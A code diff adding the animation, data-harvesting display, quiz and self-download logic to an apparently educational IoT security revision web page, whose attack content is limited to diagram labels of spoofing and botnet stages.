+      } else {
+        // Spoofing: Rogue node connects to router, router spreads malware to legit IoT
+        mitmCtx.strokeStyle = '#f43f5e';
+        mitmCtx.lineWidth = 2;
+        mitmCtx.beginPath();
+        mitmCtx.moveTo(midX, botY - 24);
+        mitmCtx.lineTo(rightX - 20, topY + 24);
+        mitmCtx.stroke();
+
+        const p1 = animTick % 1;
+        const sx = midX + (rightX - 20 - midX) * p1;
+        const sy = (botY - 24) + (topY + 24 - (botY - 24)) * p1;
+        mitmCtx.fillStyle = '#f43f5e';
+        mitmCtx.beginPath();
+        mitmCtx.arc(sx, sy, 6, 0, Math.PI * 2);
+        mitmCtx.fill();
+
+        // Lateral spread from router to legit IoT
+        const lx = rightX - (rightX - leftX) * p1;
+        mitmCtx.fillStyle = '#f59e0b';
+        mitmCtx.beginPath();
+        mitmCtx.arc(lx, topY, 6, 0, Math.PI * 2);
+        mitmCtx.fill();
+
+        drawNodeBox(mitmCtx, leftX, topY, 130, 48, 'Target IoT Nodes', 'Infected Laterally', '#f59e0b');
+        drawNodeBox(mitmCtx, rightX, topY, 130, 48, 'Compromised Router', 'Injects Malware', '#f43f5e');
+        drawNodeBox(mitmCtx, midX, botY, 175, 48, 'Rogue Spoofed Node', 'Fake MAC/IP Identity', '#f43f5e');
+      }
+      mitmCtx.restore();
+    }
+
+    // 2. Botnet Enslavement Pipeline Canvas
+    const botnetCanvas = document.getElementById('botnetCanvas');
+    if (state.currentModule === 4 && botnetCanvas && botnetCanvas.parentElement) {
+      const bCtx = botnetCanvas.getContext('2d');
+      const rect = botnetCanvas.parentElement.getBoundingClientRect();
+      const dpr = window.devicePixelRatio || 1;
+      const w = Math.max(300, rect.width - 32);
+      const h = 190;
+      if (botnetCanvas.width !== Math.round(w * dpr)) {
+        botnetCanvas.width = w * dpr;
+        botnetCanvas.height = h * dpr;
+        botnetCanvas.style.width = `${w}px`;
+        botnetCanvas.style.height = `${h}px`;
+      }
+      bCtx.save();
+      bCtx.scale(dpr, dpr);
+      bCtx.clearRect(0, 0, w, h);
+
+      const stages = [
+        { x: w * 0.12, title: '1. Attacker', sub: 'Default Cred Scan', color: '#f43f5e' },
+        { x: w * 0.37, title: '2. IoT Bot Swarm', sub: 'Cameras / Routers', color: '#f59e0b' },
+        { x: w * 0.63, title: '3. C2 Server', sub: 'Command & Control', color: '#06b6d4' },
+        { x: w * 0.88, title: '4. Cyber Attacks', sub: 'DDoS / Spam / Mine', color: '#8b5cf6' }
+      ];
+
+      const cy = 95;
+      const boxW = Math.min(148, w * 0.21);
+
+      // Connecting arrows
+      bCtx.strokeStyle = '#475569';
+      bCtx.lineWidth = 2;
+      for (let i = 0; i < stages.length - 1; i++) {
+        const x1 = stages[i].x + boxW / 2;
+        const x2 = stages[i + 1].x - boxW / 2;
+        bCtx.beginPath();
+        bCtx.moveTo(x1, cy);
+        bCtx.lineTo(x2, cy);
+        bCtx.stroke();
+
+        // Moving pulse dot
+        const pulse = (animTick + i * 0.33) % 1;
+        const px = x1 + (x2 - x1) * pulse;
+        bCtx.fillStyle = stages[i].color;
+        bCtx.beginPath();
+        bCtx.arc(px, cy, 5, 0, Math.PI * 2);
+        bCtx.fill();
+      }
+
+      stages.forEach(s => {
+        drawNodeBox(bCtx, s.x, cy, boxW, 58, s.title, s.sub, s.color);
+      });
+
+      bCtx.restore();
+    }
+
+    requestAnimationFrame(renderAnimations);
+  }
+  requestAnimationFrame(renderAnimations);
+
+  // 4.5 Sensitive Data Harvesting Matrix
+  function renderHarvestDevices() {
+    const grid = document.getElementById('harvestDeviceGrid');
+    grid.innerHTML = harvestDevices.map(d => `
+      <button class="device-btn ${d.id === state.selectedHarvestDevice ? 'active' : ''}" data-dev="${d.id}">
+        ${d.icon}
+        <span style="font-size:0.82rem;font-weight:700;">${d.name}</span>
+      </button>
+    `).join('');
+
+    grid.querySelectorAll('.device-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        state.selectedHarvestDevice = btn.dataset.dev;
+        renderHarvestDevices();
+        renderHarvestOutput();
+      });
+    });
+  }
+
+  function renderHarvestOutput() {
+    const dev = harvestDevices.find(d => d.id === state.selectedHarvestDevice);
+    document.getElementById('harvestOutputDrawer').innerHTML = `
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:0.5rem;">
+        <strong style="color:var(--accent-coral);font-size:0.95rem;">Target Device: ${dev.name}</strong>
+        <span class="tag tag-coral">Exfiltrated Data Profile</span>
+      </div>
+      <ul style="padding-left:1.2rem;color:var(--text-primary);display:flex;flex-direction:column;gap:4px;">
+        ${dev.data.map(item => `<li>${item}</li>`).join('')}
+      </ul>
+    `;
+  }
+  renderHarvestDevices();
+  renderHarvestOutput();
+
+  // ==================== MODULE 5: ACTIVE RECALL QUIZ ====================
+  function renderQuiz() {
+    const container = document.getElementById('quizContainer');
+    container.innerHTML = quizQuestions.map((qObj, qIdx) => {
+      const answered = state.quizAnswers[qIdx] !== undefined;
+      const chosen = state.quizAnswers[qIdx];
+
+      return `
+        <div class="quiz-question-card">
+          <div class="quiz-q-title">${qObj.q}</div>
+          <div class="quiz-options">
+            ${qObj.options.map((opt, oIdx) => {
+              let cls = 'quiz-opt';
+              if (answered) {
+                if (oIdx === qObj.correct) cls += ' correct';
+                else if (oIdx === chosen) cls += ' incorrect';
+              }
+              return `
+                <button class="${cls}" ${answered ? 'disabled' : ''} onclick="answerQuiz(${qIdx}, ${oIdx})">
+                  <span style="font-family:var(--font-mono);font-weight:700;color:var(--accent-cyan);">${String.fromCharCode(65 + oIdx)}.</span>
+                  <span>${opt}</span>
+                </button>
+              `;
+            }).join('')}
+          </div>
+          <div class="quiz-feedback ${answered ? 'show' : ''}" style="background:${chosen === qObj.correct ? 'rgba(16,185,129,0.12)' : 'rgba(244,63,94,0.12)'};border:1px solid ${chosen === qObj.correct ? 'rgba(16,185,129,0.35)' : 'rgba(244,63,94,0.35)'};">
+            <strong>${chosen === qObj.correct ? '✓ Correct:' : '✗ Incorrect:'}</strong> ${qObj.explanation}
+          </div>
+        </div>
+      `;
+    }).join('');
+
+    updateQuizScore();
+  }
+
+  window.answerQuiz = function(qIdx, oIdx) {
+    if (state.quizAnswers[qIdx] !== undefined) return;
+    state.quizAnswers[qIdx] = oIdx;
+    renderQuiz();
+  };
+
+  function updateQuizScore() {
+    const answeredCount = Object.keys(state.quizAnswers).length;
+    let score = 0;
+    Object.entries(state.quizAnswers).forEach(([qIdx, oIdx]) => {
+      if (quizQuestions[Number(qIdx)].correct === oIdx) score++;
+    });
+
+    document.getElementById('quizScoreBadge').textContent = `Score: ${score} / ${quizQuestions.length}`;
+
+    const summaryCard = document.getElementById('quizSummaryCard');
+    if (answeredCount === quizQuestions.length) {
+      summaryCard.style.display = 'block';
+      document.getElementById('quizFinalHeadline').textContent = `Final Score: ${score} / ${quizQuestions.length} (${Math.round((score / quizQuestions.length) * 100)}%)`;
+      document.getElementById('quizFinalSubtext').textContent = score >= 8
+        ? 'Excellent mastery! You are well-prepared for Week 11 IoT Security exam questions.'
+        : 'Review the highlighted explanations above and retake the quiz to hit 80%+ mastery.';
+    } else {
+      summaryCard.style.display = 'none';
+    }
+  }
+
+  window.resetQuiz = function() {
+    state.quizAnswers = {};
+    renderQuiz();
+  };
+
+  document.getElementById('resetQuizBtn').addEventListener('click', window.resetQuiz);
+  renderQuiz();
+
+  // ==================== DOWNLOAD SELF-CONTAINED HTML FILE ====================
+  document.getElementById('downloadHtmlBtn').addEventListener('click', () => {
+    const htmlContent = '<!DOCTYPE html>\n' + document.documentElement.outerHTML;
+    const blob = new Blob([htmlContent], { type: 'text/html;charset=utf-8' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'Week11-IoT-Security-Revision-Guide.html';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+
+    const toast = document.getElementById('toastNotification');
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 3000);
+  });
+
+  // ==================== INITIAL RENDER & RESIZE HANDLER ====================
+  window.addEventListener('resize', () => {
+    if (state.currentModule === 1) drawGrowthChart(1);
+    if (state.currentModule === 2) drawMiraiChart();
+  });
+
+  window.addEventListener('load', () => {
+    animateGrowthChart();
+  });
+})();
+</script>
+</body>
+</html>
